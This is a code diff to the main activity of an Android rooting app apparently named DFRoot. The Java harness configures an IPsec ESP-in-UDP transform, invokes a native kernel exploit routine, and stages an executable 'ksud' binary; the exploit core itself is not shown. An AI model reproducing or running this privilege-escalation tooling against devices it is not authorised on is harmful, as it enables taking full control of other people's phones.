@@ -48,7 +48,7 @@ public class MainActivity extends AppCompatActivity implements IReporter {
 
     static native int nativeRunAll(IReporter reporter, int encapPort, int spi,
                                     byte[] aesCbcKey, byte[] hmacKey, int icvLen,
-                                    int senderPort, String ksudPath, boolean softReboot);
+                                    int senderPort, boolean softReboot);
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -62,7 +62,8 @@ public class MainActivity extends AppCompatActivity implements IReporter {
         binding.btnRun.setOnClickListener(v -> {
             binding.btnRun.setEnabled(false);
             binding.outputView.setText("");
-            mExec.execute(() -> runExploit());
+            boolean softReboot = binding.switchManualSoftReboot.isChecked();
+            mExec.execute(() -> runExploit(softReboot));
         });
 
         ComponentName bootReceiver = new ComponentName(this, BootReceiver.class);
@@ -88,7 +89,7 @@ public class MainActivity extends AppCompatActivity implements IReporter {
                 .edit().putBoolean("auto_soft_reboot", checked).apply());
     }
 
-    private void runExploit() {
+    private void runExploit(boolean softReboot) {
         try {
             report("=== setup ===\n");
             IpSecManager ipsec = (IpSecManager) getSystemService(IPSEC_SERVICE);
@@ -120,14 +121,12 @@ public class MainActivity extends AppCompatActivity implements IReporter {
                     .setIpv4Encapsulation(encapSock, senderPort)
                     .buildTransportModeTransform(loopback, spiObj);
 
-            stageAsset(this, "ksud", true, getFilesDir());
-            report("ksud staged to: " + new File(getFilesDir(), "ksud").getAbsolutePath() + "\n");
+            stageKsud(this, this);
 
             report("\n");
             report("=== exploit ===\n");
             int icvLen = 128 / 8;
-            String ksudPath = new File(getFilesDir(), "ksud").getAbsolutePath();
-            int rc = nativeRunAll(this, encapPort, spiVal, aesKey, hmacKey, icvLen, senderPort, ksudPath, false);
+            int rc = nativeRunAll(this, encapPort, spiVal, aesKey, hmacKey, icvLen, senderPort, softReboot);
             final String toastMsg = rc == 0 ? "DFRoot: SUCCESS"
                     : rc == 1 ? "DFRoot FAILED: ksud exited with error"
                     : rc == 2 ? "DFRoot FAILED: check logs"
@@ -149,16 +148,17 @@ public class MainActivity extends AppCompatActivity implements IReporter {
         }
     }
 
-    static void stageAsset(Context ctx, String name, boolean executable, File dir) throws IOException {
-        File dest = new File(dir, name);
+    static void stageKsud(Context ctx, IReporter reporter) throws IOException {
+        File dest = new File(ctx.getFilesDir().getParentFile(), "ksud");
         File tmp = new File(dest.getPath() + ".tmp");
-        try (InputStream in = ctx.getAssets().open(name);
+        try (InputStream in = ctx.getAssets().open("ksud");
              OutputStream out = new FileOutputStream(tmp)) {
             byte[] buf = new byte[8192];
             for (int n; (n = in.read(buf)) > 0; ) out.write(buf, 0, n);
         }
         if (!tmp.renameTo(dest)) { tmp.delete(); throw new IOException("rename failed: " + dest); }
-        if (executable) dest.setExecutable(true, false);
+        dest.setExecutable(true, false);
+        reporter.report("ksud staged to: " + dest.getAbsolutePath() + "\n");
     }
 
 }
